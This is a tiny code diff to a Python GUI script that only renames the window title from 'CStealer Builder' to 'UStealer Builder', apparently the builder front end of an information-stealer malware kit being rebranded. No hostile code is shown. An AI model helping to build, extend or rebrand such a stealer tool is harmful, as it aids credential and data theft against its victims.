@@ -8,7 +8,7 @@ import re
 
 ctk.set_appearance_mode("dark")
 app = ctk.CTk()
-app.title(f"CStealer Builder ~ Version 1.3")
+app.title(f"UStealer Builder ~ Version 1.3")
 app.geometry("400x240")
 app.resizable(False, False)
           
